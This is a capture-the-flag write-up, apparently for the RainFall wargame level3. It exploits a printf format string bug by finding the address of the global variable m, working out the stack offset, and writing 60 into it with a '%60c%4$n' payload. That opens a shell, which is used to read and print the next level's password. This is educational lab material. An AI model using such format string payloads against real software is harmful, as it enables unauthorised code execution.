
```
    int m = 0;

    int v() 
    {
        char buffer[512];

        fgets(buffer, sizeof(buffer), stdin);

        printf(buffer);

        int m_1 = m;
        if (m_1 != 60)
        {
            return m_1;
        }

        fwrite("Wait what?!\n", 1, 12, stdout);
        
        return system("/bin/sh");
    }

    int main(int argc, char** argv, char** envp) 
    {
        return v();
    }
```

We have a global variable m is initialized to 0 if m == 60, the v() function prints “Wait what?!” and spawns a shell.

Since m is a global, not a stack variable, we need to find its memory address and then include that in our input to overwrite it to 60.

and we have printf(buffer); a format string vulnerability to overwrite the global variable m with 60

Lets find the adress of m 

```
    (gdb) info variables
    All defined variables:

    Non-debugging symbols:
    0x080485f8  _fp_hw
    0x080485fc  _IO_stdin_used
    0x08048734  __FRAME_END__
    0x08049738  __CTOR_LIST__
    0x08049738  __init_array_end
    0x08049738  __init_array_start
    0x0804973c  __CTOR_END__
    0x08049740  __DTOR_LIST__
    0x08049744  __DTOR_END__
    0x08049748  __JCR_END__
    0x08049748  __JCR_LIST__
    0x0804974c  _DYNAMIC
    0x08049818  _GLOBAL_OFFSET_TABLE_
    0x0804983c  __data_start
    0x0804983c  data_start
    0x08049840  __dso_handle
    0x08049860  stdin@@GLIBC_2.0
    0x08049880  stdout@@GLIBC_2.0
    0x08049884  completed.6159
    0x08049888  dtor_idx.6161
    0x0804988c  m
```

the address of m is 0x0804988c in little-indian \x8c\x98\x04\x08

geting the argument in the stack:

```
    ./level3 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
    AAAABBBB.200..b7fd1ac0..b7ff37d0..41414141..42424242..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
```

the argument is 4

```
    level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")'; cat) | ./level3
    �                                                           
    Wait what?!
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10460cf545b20bea8572ebdc3c36fa
```


- "%60c%4$n"

%60c => Prints 60 characters (adds 60 to the total printf counter).

%4$n => Writes the current character count (60) into the 4th argument on the stack, which is our memory address.

So, the result is Write the number 60 into the address 0x0804988c.

```
    ./level3 <<< $(python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n" + ".%x." * 30)')
    �                                                           .b7fd1ac0..b7ff37d0..804988c..63303625..6e243425..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
    Wait what?!
```